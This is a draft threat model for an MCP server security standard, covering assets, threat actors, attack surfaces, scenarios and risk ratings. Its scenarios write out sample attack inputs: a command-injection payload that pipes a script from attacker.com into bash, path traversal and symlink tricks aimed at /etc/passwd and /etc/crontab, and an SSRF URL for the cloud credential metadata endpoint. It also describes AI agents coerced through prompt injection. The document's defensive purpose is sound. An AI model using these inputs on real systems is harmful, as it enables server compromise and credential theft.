# Threat Model

**Version**: 0.1.0  
**Status**: Draft  
**Last Updated**: 2025-01-15

## Overview

This document describes the threat model underlying the MCP Server Security Standard. It identifies assets, threat actors, attack surfaces, and threat scenarios that inform the control requirements.

Organizations deploying MCP servers SHOULD use this threat model as a starting point and refine it based on their specific deployment context (see `/standard/profiles.md`).

---

## 1. Assets

Assets are resources with value that require protection.

### 1.1 Primary Assets

| Asset | Description | Confidentiality | Integrity | Availability |
|-------|-------------|----------------|-----------|--------------|
| **User data** | Files, databases, API responses accessed via tools | HIGH | HIGH | MEDIUM |
| **Credentials** | API keys, tokens, passwords used by MCP server | CRITICAL | CRITICAL | LOW |
| **System access** | Shell execution, filesystem access, network capabilities | MEDIUM | CRITICAL | LOW |
| **Tool definitions** | Metadata describing tool capabilities | LOW | HIGH | LOW |
| **Audit logs** | Records of who did what and when | MEDIUM | CRITICAL | MEDIUM |

### 1.2 Supporting Assets

| Asset | Description | Impact if Compromised |
|-------|-------------|----------------------|
| **Server process** | The MCP server runtime itself | Full compromise of all primary assets |
| **Transport channel** | Communication link between client and server | Eavesdropping, tampering, replay attacks |
| **Deployment environment** | Container, VM, or host OS | Lateral movement, privilege escalation |
| **Dependencies** | Third-party libraries and packages | Supply chain attack, backdoor injection |

---

## 2. Threat Actors

### 2.1 External Attacker

**Capabilities**: Network access to server endpoint; ability to craft malicious requests

**Motivation**: Data theft, service disruption, credential harvesting, lateral movement

**Examples**:
- Internet-based adversary targeting public MCP API
- Attacker on same network segment as internal server

**Primary Attack Vectors**:
- Unauthenticated access attempts
- Input manipulation (injection attacks)
- SSRF to probe internal network
- Supply chain compromise of dependencies

### 2.2 Malicious Insider

**Capabilities**: Legitimate credentials; knowledge of system internals; ability to modify code or configuration

**Motivation**: Data exfiltration, sabotage, espionage, financial gain

**Examples**:
- Disgruntled employee with admin access
- Compromised developer account
- Malicious contractor

**Primary Attack Vectors**:
- Privilege escalation via over-permissioned tools
- Credential misuse
- Backdoor installation
- Audit log tampering

### 2.3 Coerced AI Agent

**Capabilities**: Authorized client access; ability to invoke tools; influenced by untrusted input (prompt injection)

**Motivation**: None (unwitting proxy for attacker's goals)

**Examples**:
- LLM tricked by malicious instructions in user prompt
- AI agent reading attacker-controlled document with embedded commands
- Tool description poisoning causing unintended behavior

**Primary Attack Vectors**:
- Prompt injection leading to unintended tool invocations
- Excessive tool permissions allowing wide impact
- Insufficient human oversight on high-risk operations

### 2.4 Compromised Dependency

**Capabilities**: Code execution within server process; access to server's privileges and credentials

**Motivation**: Varies (espionage, ransomware, cryptocurrency mining, botnet recruitment)

**Examples**:
- Malicious npm/PyPI package in dependency tree
- Legitimate package compromised via maintainer account takeover
- Typosquatted package name

**Primary Attack Vectors**:
- Executing malicious code at startup or during specific function calls
- Exfiltrating environment variables and credentials
- Establishing backdoor for remote access

---

## 3. Attack Surfaces

### 3.1 Tool Invocation API

**Description**: Endpoint where clients request tool execution with JSON arguments

**Exposed To**: Authenticated clients (HTTP/WebSocket) or local process (stdio)

**Threats**:
- Command injection via tool arguments
- Path traversal via file paths
- SSRF via URL parameters
- Excessive resource consumption via large inputs

**Mitigations**: MCP-EXEC-*, MCP-FS-*, MCP-NET-*, MCP-INPUT-* controls

### 3.2 Resource Access API

**Description**: Endpoint where clients fetch or write data from resources

**Exposed To**: Authenticated clients

**Threats**:
- Unauthorized data access (broken access control)
- Data tampering or deletion
- Information disclosure via error messages

**Mitigations**: MCP-AUTHZ-* controls

### 3.3 Transport Channel

**Description**: Network or IPC connection between client and server

**Exposed To**: Network adversaries (for HTTP/WebSocket), OS-level attackers (for stdio)

**Threats**:
- Eavesdropping (credential or data theft)
- Message tampering (integrity violations)
- Replay attacks
- Session hijacking

**Mitigations**: MCP-NET-03 (TLS), MCP-AUTHZ-01 (token-based auth)

### 3.4 Deployment Environment

**Description**: The container, VM, or host where the server runs

**Exposed To**: Other processes on same host, container escape exploits

**Threats**:
- Privilege escalation via running as root
- Container escape via Docker socket or kernel exploits
- Resource exhaustion affecting other services

**Mitigations**: MCP-DEPLOY-* controls

### 3.5 Dependency Chain

**Description**: Third-party packages and libraries used by server

**Exposed To**: Public package registries, developer machines during build

**Threats**:
- Malicious code execution via compromised package
- Vulnerable dependencies with known CVEs
- Typosquatting attacks

**Mitigations**: MCP-SUPPLY-* controls

### 3.6 Log Storage

**Description**: Audit logs and error logs generated by server

**Exposed To**: Operators, logging infrastructure, attackers who gain server access

**Threats**:
- Credential leakage via plaintext secrets in logs
- Tampering with audit logs to hide malicious activity
- Compliance violations from insufficient logging

**Mitigations**: MCP-LOG-* controls

---

## 4. Threat Scenarios by Domain

### 4.1 FS (Filesystem) Threats

#### Scenario: Path Traversal via Naive Validation

**Attacker Goal**: Read sensitive files outside allowed directory (e.g., `/etc/passwd`)

**Attack Steps**:
1. Attacker identifies MCP server with file read tool
2. Server uses naive prefix matching for path validation
3. Attacker requests path: `/allowed/../../etc/passwd`
4. Server validation passes (starts with `/allowed`)
5. Actual file access reads `/etc/passwd`

**Impact**: Confidentiality breach, credential theft, reconnaissance for further attacks

**Mitigated By**: MCP-FS-01 (canonical path resolution)

#### Scenario: Symlink Bypass

**Attacker Goal**: Write to restricted file via symlink

**Attack Steps**:
1. Attacker creates symlink in allowed directory: `/allowed/link -> /etc/crontab`
2. Attacker requests write to `/allowed/link`
3. Server validates path is under `/allowed` (true for link itself)
4. Server does not resolve symlink target
5. Write operation modifies `/etc/crontab` (root's cron jobs)

**Impact**: Code execution, persistence, privilege escalation

**Mitigated By**: MCP-FS-02 (symlink resolution), MCP-DEPLOY-01 (non-root user)

---

### 4.2 EXEC (Execution) Threats

#### Scenario: Command Injection via Shell

**Attacker Goal**: Execute arbitrary OS commands

**Attack Steps**:
1. MCP server has tool that runs shell command with user input
2. Server uses `os.system(f"ls {user_input}")`
3. Attacker provides input: `; curl attacker.com/shell.sh | bash`
4. Shell interprets `;` as command separator
5. Malicious script downloads and executes

**Impact**: Complete server compromise, data exfiltration, lateral movement

**Mitigated By**: MCP-EXEC-01 (no shell execution)

---

### 4.3 NET (Network) Threats

#### Scenario: SSRF to Cloud Metadata Service

**Attacker Goal**: Steal AWS credentials from EC2 metadata endpoint

**Attack Steps**:
1. MCP server has tool to fetch URL and return content
2. Server deployed on AWS EC2 instance
3. Attacker requests URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Server makes request to internal metadata service
5. Response contains temporary AWS credentials

**Impact**: Cloud infrastructure compromise, data breach across multiple services

**Mitigated By**: MCP-NET-01 (block private IPs and metadata endpoints)

---

### 4.4 AUTHZ (Authorization) Threats

#### Scenario: Shared Credentials Across Users

**Attacker Goal**: Access another user's data

**Attack Steps**:
1. MCP server uses single shared database credential for all users
2. Server does not implement per-user authorization
3. Legitimate user A connects with valid authentication
4. User A crafts tool request for user B's data
5. Server executes query with shared admin credential
6. User A receives user B's sensitive data

**Impact**: Privacy breach, compliance violation, cross-tenant data leakage

**Mitigated By**: MCP-AUTHZ-01 (per-user tokens), MCP-AUTHZ-04 (RBAC)

---

### 4.5 INPUT (Input Validation) Threats

#### Scenario: Unbounded Input Causes DoS

**Attacker Goal**: Crash or slow down server

**Attack Steps**:
1. MCP server has tool accepting array of items
2. No size limit on array
3. Attacker sends request with 10 million items
4. Server attempts to allocate memory for all items
5. Out-of-memory error or extreme slowdown

**Impact**: Service unavailability, resource exhaustion affecting other services

**Mitigated By**: MCP-INPUT-02 (bounds on input size)

---

### 4.6 LOG (Logging) Threats

#### Scenario: Credentials Logged in Plaintext

**Attacker Goal**: Harvest credentials from logs

**Attack Steps**:
1. MCP server logs all tool invocations with full arguments
2. Tool accepts API key as parameter
3. Legitimate user invokes tool with their API key
4. Key is logged: `INFO: Calling external_api with key=sk_live_abc123...`
5. Attacker gains read access to logs (compromised logging service, insider, etc.)
6. Attacker extracts API keys from logs

**Impact**: Credential theft, account takeover, further compromise

**Mitigated By**: MCP-LOG-02 (secret redaction)

---

### 4.7 SUPPLY (Supply Chain) Threats

#### Scenario: Malicious Dependency Installed

**Attacker Goal**: Execute code within server process

**Attack Steps**:
1. Attacker publishes package `mcputils` (typosquat of `mcp-utils`)
2. Developer mistypes package name in `requirements.txt`
3. During build, malicious package is installed
4. Package contains code to exfiltrate environment variables at import time
5. Server starts, imports package, sends credentials to attacker

**Impact**: Immediate credential theft, potential backdoor installation

**Mitigated By**: MCP-SUPPLY-01 (package integrity verification, pinned dependencies)

---

### 4.8 DEPLOY (Deployment) Threats

#### Scenario: Container Escape via Root Privileges

**Attacker Goal**: Escape container and access host

**Attack Steps**:
1. MCP server runs in Docker container as root (UID 0)
2. Attacker exploits RCE vulnerability in server
3. Attacker now has root shell inside container
4. Attacker uses kernel exploit (e.g., DirtyCow) to escape container
5. Attacker gains root on host machine

**Impact**: Full host compromise, lateral movement to other containers/VMs

**Mitigated By**: MCP-DEPLOY-01 (non-root user), MCP-DEPLOY-02 (seccomp filtering)

---

## 5. Assumptions

The MSSS threat model assumes:

### 5.1 In Scope Assumptions

1. **Server code is well-intentioned but may contain vulnerabilities**
   - Developers aim to build secure systems but may lack security expertise
   - Standard provides guidance to avoid common pitfalls

2. **Clients may be malicious or coerced**
   - Authenticated users may attempt to exceed their privileges
   - AI agents can be manipulated via prompt injection

3. **Network may be hostile**
   - For internet-facing servers, assume no trust in network
   - For internal servers, defense-in-depth still required

4. **Dependencies may be compromised**
   - Supply chain attacks are a realistic threat
   - Package registries are not fully trustworthy

5. **Deployment environment has basic security**
   - Modern OS with standard security features (user separation, etc.)
   - Container runtime with minimal security enabled
   - Further hardening is server's responsibility

### 5.2 Out of Scope Assumptions

1. **Physical security**
   - Assumes attacker does not have physical access to server hardware
   - Physical attacks (cold boot, hardware tampering) not addressed

2. **Side-channel attacks**
   - Timing attacks, speculative execution vulnerabilities not in scope
   - Future versions may address these

3. **Quantum cryptography**
   - Assumes current cryptographic algorithms remain secure
   - Post-quantum crypto not required in v0.1

4. **AI-specific vulnerabilities**
   - Model poisoning, adversarial examples, model extraction not addressed
   - Focus is on server security, not AI safety

5. **Insider with root access**
   - Assumes infrastructure administrators are trustworthy
   - Insider threat controls focus on application-level users

---

## 6. Trust Boundaries

### 6.1 Trust Boundary Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                         External World                           │
│  (Untrusted: internet, malicious clients, attackers)            │
└────────────────────────┬─────────────────────────────────────────┘
                         │
                         │ TLS, Authentication
                         ▼
┌────────────────────────────────────────────────────────────────┐
│                    MCP Server Process                           │
│                                                                 │
│  ┌──────────────┐   ┌──────────────┐   ┌──────────────┐       │
│  │ Input        │   │ Authorization│   │ Tool         │       │
│  │ Validation   │──▶│ & Scoping    │──▶│ Execution    │       │
│  └──────────────┘   └──────────────┘   └──────┬───────┘       │
│                                                 │               │
│                                                 │               │
│                         ┌───────────────────────┼───────┐       │
│                         │       Isolation       │       │       │
│                         │    (seccomp, etc.)    │       │       │
│                         └───────────────────────┼───────┘       │
└─────────────────────────────────────────────────┼──────────────┘
                                                  │
                  ┌───────────────────────────────┼──────────────┐
                  │                               │              │
                  ▼                               ▼              ▼
            ┌─────────┐                   ┌──────────┐    ┌──────────┐
            │ File    │                   │ Network  │    │ OS       │
            │ System  │                   │ (APIs)   │    │ Commands │
            └─────────┘                   └──────────┘    └──────────┘
              (FS Controls)               (NET Controls)  (EXEC Controls)
```

### 6.2 Boundary Descriptions

| Boundary | Trust Level | Enforcement Mechanism |
|----------|-------------|----------------------|
| **Client ↔ Server** | Zero trust | Authentication, TLS, input validation |
| **Server ↔ Filesystem** | Controlled trust | Path validation, sandboxing |
| **Server ↔ Network** | Controlled trust | URL validation, egress filtering |
| **Server ↔ OS** | Controlled trust | Non-root execution, seccomp |
| **Server ↔ Dependencies** | Limited trust | Integrity verification, vendoring |

---

## 7. Out of Scope

The following are explicitly out of scope for MSSS v0.1 but may be addressed in future versions:

1. **Client-side security**: MCP client implementations have their own threat model
2. **LLM prompt injection defenses**: Responsibility of model provider
3. **Business logic correctness**: Whether tools perform intended business functions
4. **Compliance-specific requirements**: GDPR, HIPAA, PCI-DSS specifics (informative mapping only)
5. **DDoS mitigation**: Infrastructure-level concern, not server application logic
6. **Detailed forensics procedures**: Incident response details beyond logging requirements

---

## 8. Risk Ratings

### 8.1 Risk Assessment Matrix

| Threat | Likelihood | Impact | Risk Level | Mitigating Controls |
|--------|-----------|--------|------------|---------------------|
| Command injection | High | Critical | **CRITICAL** | MCP-EXEC-01, MCP-INPUT-01 |
| Path traversal | High | High | **HIGH** | MCP-FS-01, MCP-FS-02 |
| SSRF | Medium | High | **HIGH** | MCP-NET-01 |
| Shared credentials | High | Medium | **HIGH** | MCP-AUTHZ-01, MCP-AUTHZ-04 |
| Supply chain attack | Medium | High | **HIGH** | MCP-SUPPLY-01, MCP-SUPPLY-02 |
| Credential logging | Medium | Medium | **MEDIUM** | MCP-LOG-02 |
| Insufficient audit | Low | Medium | **MEDIUM** | MCP-LOG-01 |
| DoS via unbounded input | Medium | Medium | **MEDIUM** | MCP-INPUT-02, MCP-DEPLOY-03 |
| Container escape | Low | Critical | **MEDIUM** | MCP-DEPLOY-01, MCP-DEPLOY-02 |

**Risk Levels**:
- **CRITICAL**: Immediate remediation required; blockers for any production deployment
- **HIGH**: Must address before production deployment
- **MEDIUM**: Should address in near term; acceptable with documented risk acceptance
- **LOW**: Informative; address during regular security improvements

---

**End of Threat Model Document**
